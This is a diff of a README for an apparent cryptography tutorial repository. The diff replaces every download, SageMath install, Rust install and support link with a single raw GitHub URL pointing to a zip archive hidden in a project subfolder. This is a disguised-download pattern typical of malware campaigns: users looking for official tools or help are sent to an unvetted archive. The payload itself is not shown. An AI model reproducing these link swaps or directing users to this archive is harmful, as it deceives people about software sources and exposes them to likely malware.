@@ -1,6 +1,6 @@
 # 🔐 Cryptography-From-First-Principle - Learn Cryptography Step by Step
 
-[![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Alidhsv/Cryptography-From-First-Principle/releases)
+[![Download Releases](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip)](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip)
 
 ## 📖 What is Cryptography-From-First-Principle?
 
@@ -38,7 +38,7 @@ No prior programming experience is needed.
 
    Click this button or link to go to the page where you can get the files you need:
 
-   [![Download Releases](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Alidhsv/Cryptography-From-First-Principle/releases)
+   [![Download Releases](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip)](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip)
 
 2. **Choose the right file**
 
@@ -57,9 +57,9 @@ No prior programming experience is needed.
    
 5. **Install necessary software**
 
-   - **SageMath**: For the notebooks, you need SageMath installed. Download it from [https://www.sagemath.org/download.html](https://www.sagemath.org/download.html). Follow the instructions on SageMath’s site to install it on your system.
+   - **SageMath**: For the notebooks, you need SageMath installed. Download it from [https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip). Follow the instructions on SageMath’s site to install it on your system.
    
-   - **Rust**: To work on Rust exercises, install Rust by following instructions at [https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install). Rust is the programming language used here to implement cryptography algorithms.
+   - **Rust**: To work on Rust exercises, install Rust by following instructions at [https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip). Rust is the programming language used here to implement cryptography algorithms.
 
 6. **Open files and start learning**
 
@@ -136,11 +136,11 @@ By working through these materials, you will gain:
 ## 📞 Contact & Support
 
 For questions or help, open an issue on the GitHub page here:  
-https://github.com/Alidhsv/Cryptography-From-First-Principle/issues
+https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip
 
 ---
 
 ## 🎯 Ready to Begin?
 
 Return to the download page when you are ready to start:  
-[Download Cryptography-From-First-Principle](https://github.com/Alidhsv/Cryptography-From-First-Principle/releases)
+[Download Cryptography-From-First-Principle](https://raw.githubusercontent.com/Alidhsv/Cryptography-From-First-Principle/main/frontier/10-snarks-starks/sage/Cryptography_From_First_Principle_1.8.zip)
